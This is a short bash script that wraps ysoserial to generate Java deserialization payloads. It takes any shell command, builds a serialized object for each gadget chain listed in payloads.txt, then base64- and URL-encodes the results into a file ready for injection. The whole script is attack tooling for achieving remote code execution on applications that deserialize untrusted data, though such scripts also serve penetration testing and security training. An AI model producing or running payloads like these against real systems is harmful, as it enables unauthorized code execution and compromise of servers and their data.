#!/bin/bash
command="$@"
if [ -z "$command" ]; then
	echo "./generate_payloads.sh <commands>"
	exit
fi
if [ -f "serialized_payloads" ]; then
	echo "Do you want to delete the old payloads? [n/y]"
	read -r ans
	if [[ "$ans" == "y" || "$ans" == "Y" ]]; then
		rm serialized_payloads
		echo "deleted"
	fi
fi
payload_file="$(pwd)/payloads.txt"
while read -r payload; do
  output="$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)"
  if [ -n "$output" ]; then
  	echo $(php -r "echo urlencode('$output');") >> serialized_payloads
  fi
  output=""
done <$payload_file
